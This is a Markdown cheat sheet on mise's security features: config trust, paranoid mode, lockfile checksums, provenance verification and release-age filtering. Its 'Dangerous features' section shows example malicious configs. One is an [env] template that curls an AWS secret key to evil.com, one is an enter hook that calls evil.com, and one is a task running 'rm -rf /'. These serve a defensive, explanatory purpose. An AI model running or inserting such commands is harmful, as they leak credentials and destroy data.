# Mise Security & Trust — Cheat Sheet

Mise configs can execute arbitrary code (templates, env vars, hooks, tasks). The trust system is the gate that prevents a malicious `mise.toml` from running code just because you `cd` into a cloned repo. The lockfile and provenance systems handle the other half: ensuring the binaries you download are what the author published.

---

## The trust model — why it exists

**The problem:** `mise activate` runs `mise hook-env` on every prompt. If you clone a repo with a `mise.toml` that sets `[env]` or defines hooks/tasks, that config could execute arbitrary shell code the moment you enter the directory.

- Mise checks if a config file is "trusted" before loading dangerous features
- Only potentially dangerous files are checked — `.tool-versions` (plain version lists) is always loaded; `mise.toml` with `[env]`, templates, hooks, or tasks requires trust
- Trust is stored per-file in `~/.local/share/mise/trusted-configs/`
- Global config (`~/.config/mise/config.toml`) and system config are implicitly trusted — never prompted

**What's restricted when a config is NOT trusted:**
- `[env]` variables are not loaded
- Templates (which can execute arbitrary code) are not evaluated
- Hooks are not executed
- Tasks defined in the file are not available
- `path:` plugin versions are not resolved
- Tool versions (the safe part) **are** still loaded

Mise will print a warning and tell you to run `mise trust` when it encounters an untrusted file with dangerous features.

---

## `mise trust` — granting trust

```bash
# Trust a specific file
mise trust ~/projects/myapp/mise.toml

# Trust the config file in the current directory (auto-detects)
mise trust

# Trust all config files in current dir and parents
mise trust --all

# Show trust status for configs in current dir tree
mise trust --show
```

Trust is a one-time operation in normal mode. Once trusted, the file stays trusted regardless of content changes.

**Verdict:** Just run `mise trust` after cloning a repo you trust. It's the equivalent of `direnv allow`.

---

## `mise trust --untrust` — revoking trust

```bash
# Remove trust for a specific file
mise trust --untrust ~/projects/sketchy-repo/mise.toml

# Ignore a config file entirely (won't even prompt)
mise trust --ignore ~/projects/sketchy-repo/mise.toml
```

- `--untrust` revokes trust; mise will prompt again next time it encounters the file
- `--ignore` goes further: mise pretends the file doesn't exist

**Verdict:** Use `--untrust` when you no longer trust a project. Use `--ignore` for repos where you want mise's tool management but not their env/hooks.

---

## Paranoid mode (`MISE_PARANOID=1`)

**The problem:** Normal trust is "trust once, run forever." If someone pushes a malicious change to a trusted `mise.toml`, it runs automatically because the file is already trusted.

```bash
# Enable globally
mise settings paranoid=true

# Or via environment
export MISE_PARANOID=1
```

**What paranoid mode changes:**

| Behavior | Normal | Paranoid |
|---|---|---|
| Trust check | One-time per file | Content-hashed — re-trust after any edit |
| Plugin install | Short names allowed | Only core/first-party; others need full URL |
| HTTP | Allowed (saves ~10ms TLS) | HTTPS enforced everywhere |
| Provenance verification | Trusts lockfile checksums | Re-verifies SLSA/cosign/minisign on every install |
| Global/system config | Implicitly trusted | Implicitly trusted (same) |

**Verdict:** Overkill for personal machines. Valuable for shared CI runners or high-security environments where config files change frequently via PRs.

---

## `mise.lock` — supply chain verification

> **Basic lockfile workflow** (pinning versions, committing `mise.lock`) is covered in [Tool Management](tool-management.md#mise-lock--pin-versions-for-reproducible-installs). This section covers the security layer: checksums, provenance, and strict mode.

**The problem:** `mise install` resolves version ranges by hitting GitHub APIs, then downloads tarballs. A compromised registry or MITM could serve a different binary.

```bash
# Generate lockfile
mise lock

# Strict mode: refuse to install anything not in the lockfile
mise settings locked=true   # or MISE_LOCKED=1
```

**What `mise.lock` contains (TOML):**

```toml
[tools.node]
version = "22.14.0"

[tools.node.assets."macos-arm64"]
checksum = "sha256:abc123..."
size = 48234567
url = "https://nodejs.org/dist/v22.14.0/node-v22.14.0-darwin-arm64.tar.gz"
provenance = "github-attestations"
```

- **Checksums** (SHA256/Blake3) — verify downloaded binary matches
- **Pinned URLs** — skip version resolution entirely, no API calls
- **Provenance records** — which verification method was used at lock time
- **Per-platform** — separate entries for `linux-x64`, `macos-arm64`, etc.
- Environment-specific: `mise.toml` -> `mise.lock`, `mise.test.toml` -> `mise.test.lock`

**`MISE_LOCKED=1` (strict mode):** Refuses to install any tool that doesn't have a pre-resolved URL in the lockfile. Zero network resolution. Ideal for CI.

**Verdict: Always use it.** Commit `mise.lock` to version control. It's your `package-lock.json` equivalent.

---

## Provenance verification — SLSA, cosign, attestations

**The problem:** Even with checksums in a lockfile, how do you know the checksum itself is legitimate? Provenance verifies the binary was built by the claimed CI pipeline.

```bash
# These are all ON by default
mise settings slsa=true                      # SLSA provenance checks
mise settings github_attestations=true       # GitHub artifact attestations

# Force re-verification even when lockfile has provenance
mise settings locked_verify_provenance=true  # default: false
```

- **SLSA** — verifies supply-chain levels via signed provenance from build systems
- **GitHub Artifact Attestations** — verifies binary was produced by the claimed GitHub Actions workflow
- **GPG** — `mise settings gpg_verify=true` enables GPG signature verification for plugin downloads
- In paranoid mode, provenance is re-verified on every `mise install`, not just at lock time

**Verdict:** Leave defaults on. Enable `locked_verify_provenance=true` if you're serious about supply chain security.

---

## Dangerous features: `[env]`, hooks, and tasks

**The problem:** These config sections execute arbitrary shell code. A malicious `mise.toml` in a cloned repo could exfiltrate secrets, install backdoors, or modify your system.

**`[env]` — runs on directory entry:**
```toml
[env]
# This executes a shell command every time you cd into this directory
DATABASE_URL = "{{exec(command='curl https://evil.com/steal?token=' ~ env.AWS_SECRET_KEY)}}"
```

**Hooks — run on lifecycle events:**
```toml
[hooks.enter]
shell = "bash"
script = "curl https://evil.com/pwned"  # runs when you cd in
```

**Tasks — run on explicit invocation (lower risk):**
```toml
[tasks.build]
run = "rm -rf /"  # only runs if you do `mise run build`
```

Trust is the only protection. Before trusting a new project's `mise.toml`, **read it first** — especially `[env]`, `[hooks]`, and `[tasks]` sections.

**Verdict:** Always inspect `mise.toml` before running `mise trust` on repos you didn't author. Same discipline as `direnv allow`.

---

## `MISE_TRUSTED_CONFIG_PATHS` — bulk trust

**The problem:** You have a `~/work/` directory with 50 repos, all using mise. Running `mise trust` in each one is tedious.

```bash
# In ~/.config/mise/config.toml
[settings]
trusted_config_paths = ["~/work", "~/personal"]

# Or via environment variable (colon-separated)
export MISE_TRUSTED_CONFIG_PATHS="~/work:~/personal"
```

- Any config file under these paths is automatically trusted — no prompt
- Supports directory prefixes (trusts all descendants)
- Useful in CI where you control the checkout directory

**Verdict:** Set it for directories where you control all repos. Don't set it for `~/Downloads` or `/tmp`.

---

## Trust and git workflows

**The problem:** You clone a repo, or a colleague pushes a config change. What happens?

| Scenario | Normal mode | Paranoid mode |
|---|---|---|
| Fresh `git clone` | Prompted to trust on first `cd` | Prompted to trust |
| `git pull` updates `mise.toml` | No re-prompt (already trusted) | Re-prompted (content hash changed) |
| New branch adds `mise.toml` | Prompted (new file) | Prompted (new file) |
| PR adds hooks to existing `mise.toml` | **Runs silently** (file already trusted) | Re-prompted (hash mismatch) |

The last row is the key security gap in normal mode. Once you trust a file, any future change to it runs without review.

**Best practices for teams:**
- Commit `mise.lock` — everyone gets the same tool versions and checksums
- Review `mise.toml` changes in PRs like you'd review `Makefile` or `docker-compose.yml` changes
- Consider paranoid mode on shared CI runners
- Use `MISE_TRUSTED_CONFIG_PATHS` in CI pointed at the checkout directory
- Use `mise.local.toml` for personal overrides (gitignored)

---

## `install_before` — release age filtering

**The problem:** A tool's maintainer account gets compromised and a malicious version is pushed. Your CI picks it up immediately.

```toml
# In ~/.config/mise/config.toml
[settings]
install_before = "3 days"  # ignore releases newer than 3 days
```

Similar to Renovate's `minimumReleaseAge`. Gives the community time to discover compromised releases before your systems pull them.

**Verdict:** Useful for production CI. Unnecessary for personal dev machines where you want latest.

---

## Decision guide

| Threat | Mitigation | Setting |
|---|---|---|
| Malicious `mise.toml` in cloned repo | Trust system (default) | Built-in |
| Trusted file silently changed | Paranoid mode | `MISE_PARANOID=1` |
| Compromised binary download | Lockfile checksums | `mise lock` + commit |
| Supply chain attack on build pipeline | Provenance verification | `slsa=true` (default) |
| Newly published malicious version | Release age filter | `install_before = "3 days"` |
| Untrusted community plugins | Short-name restriction | Paranoid mode |
| HTTP downgrade attack | HTTPS enforcement | Paranoid mode |
| Tedious trust prompts in your own repos | Bulk trust paths | `MISE_TRUSTED_CONFIG_PATHS` |
| CI reproducibility + no API calls | Strict locked mode | `MISE_LOCKED=1` |

---

## Related

- [Settings](settings.md) — `trusted_config_paths`, `paranoid`, and other security settings
- [CI & Bootstrap](ci-bootstrap.md) — `MISE_LOCKED=1` and CI trust patterns
- [Config Hierarchy](config-hierarchy.md) — which files require trust and where they're loaded from
